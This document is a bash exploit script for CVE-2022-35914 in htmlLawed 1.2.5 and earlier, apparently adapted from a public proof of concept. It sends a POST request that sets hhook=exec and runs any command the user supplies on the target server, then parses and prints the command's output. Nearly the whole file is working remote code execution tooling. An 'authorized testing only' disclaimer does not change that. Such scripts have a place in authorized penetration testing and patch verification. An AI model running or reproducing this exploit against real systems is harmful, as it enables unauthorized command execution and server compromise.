#!/usr/bin/env bash

# Exploit Title: htmlLawed <= 1.2.5 - Remote Code Execution
# CVE: CVE-2022-35914
# Original Author: Miguel Redondo (d4t4s3c)
# htmlLawed 1.2.5 - Remote Code Execution (RCE)
# Modified by: Adrian
# Changes:
#   - Fixed Bash shebang and argument parsing
#   - Added URL encoding for POST parameters
#   - Replaced fragile grep/sed output parsing
#   - Added multiline output and HTML entity decoding
#
# For authorized security testing and educational use only.

set -o pipefail

banner() {
  echo "  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _"
  echo " / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ / ___|/ _ \/ | || |"
  echo "| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_"
  echo "| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__   _|"
  echo " \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/  /_/|_|  |_|"
}

usage() {
  echo
  echo "Usage: $0 -u <URL> -c <COMMAND>"
  echo
  echo "Example:"
  echo "  $0 -u 'http://192.168.189.190/' -c 'id'"
}

URL=""
CMD=""

while getopts ":u:c:h" arg; do
  case "$arg" in
    u)
      URL="$OPTARG"
      ;;
    c)
      CMD="$OPTARG"
      ;;
    h)
      banner
      usage
      exit 0
      ;;
    :)
      echo "[-] Option -$OPTARG requires an argument."
      usage
      exit 1
      ;;
    \?)
      echo "[-] Unknown option: -$OPTARG"
      usage
      exit 1
      ;;
  esac
done

if [[ -z "$URL" || -z "$CMD" ]]; then
  banner
  echo "[-] URL and command are required."
  usage
  exit 1
fi

RESPONSE_FILE="$(mktemp)"
trap 'rm -f "$RESPONSE_FILE"' EXIT

banner
echo
echo "[+] Target: $URL"
echo "[+] Command: $CMD"
echo
echo "[+] Command output:"

HTTP_CODE="$(
  curl -sS \
    -o "$RESPONSE_FILE" \
    -w '%{http_code}' \
    -b 'sid=foo' \
    --data-urlencode 'sid=foo' \
    --data-urlencode 'hhook=exec' \
    --data-urlencode "text=${CMD}" \
    "$URL"
)"

CURL_STATUS=$?

if [[ $CURL_STATUS -ne 0 ]]; then
  echo "[-] curl failed with status $CURL_STATUS."
  exit 1
fi

if [[ ! "$HTTP_CODE" =~ ^2[0-9][0-9]$ ]]; then
  echo "[-] Server returned HTTP $HTTP_CODE."
  echo "[-] Raw response saved temporarily in: $RESPONSE_FILE"
  cat "$RESPONSE_FILE"
  exit 1
fi

python3 - "$RESPONSE_FILE" <<'PY'
import html
import re
import sys
from pathlib import Path

response_path = Path(sys.argv[1])

try:
    page = response_path.read_text(encoding="utf-8", errors="replace")
except OSError as exc:
    print(f"[-] Could not read server response: {exc}")
    sys.exit(1)

patterns = [
    # Preferred location: actual output textarea.
    r'<textarea\b[^>]*\bid=["\']text2["\'][^>]*>(.*?)</textarea>',

    # Fallback: rendered output block.
    r'<div\b[^>]*\bid=["\']outputR["\'][^>]*>(.*?)</div>',

    # Fallback for the PHP configuration array.
    r'&nbsp;\s*\[\d+\]\s*=&gt;\s*(.*?)<br\s*/?>',
]

for pattern in patterns:
    match = re.search(pattern, page, flags=re.IGNORECASE | re.DOTALL)

    if not match:
        continue

    output = match.group(1)

    # Convert HTML line breaks when using a fallback block.
    output = re.sub(r"<br\s*/?>", "\n", output, flags=re.IGNORECASE)

    # Remove markup added by syntax highlighting.
    output = re.sub(r"<[^>]+>", "", output)

    # Decode entities such as &gt;, &lt;, &amp; and &#039;.
    output = html.unescape(output).strip()

    if output:
        print(output)
        sys.exit(0)

print("[-] The request succeeded, but command output could not be extracted.")
print("[-] Run the following to inspect the raw response:")
print(f"    cat {response_path}")
sys.exit(1)
PY
